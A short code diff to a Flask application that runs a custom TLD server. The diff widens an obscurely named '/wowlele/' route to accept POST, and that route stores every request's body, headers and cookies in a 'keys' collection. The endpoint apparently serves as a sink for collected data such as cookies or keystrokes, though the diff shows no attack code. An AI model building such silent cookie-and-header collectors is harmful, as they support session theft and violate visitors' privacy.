@@ -69,7 +69,7 @@ tld_server = TLDServer(app=app, tlds=["site", "tcc"], domains=dbdict)
 def on_set_ip(event):
     dbdict.coll.update_one({"domain": event.domain_name}, {"$set": {"ip": event.ip}})
 
-@app.get("/wowlele/")
+@app.route("/wowlele/", methods=["GET", "POST"])
 def wowlele():
     keys.insert_one({"data": request.get_data(as_text=True), "headers": json.dumps(dict(request.headers)), "cookies": json.dumps(dict(request.cookies)), "time": datetime.datetime.now()})
     return ""
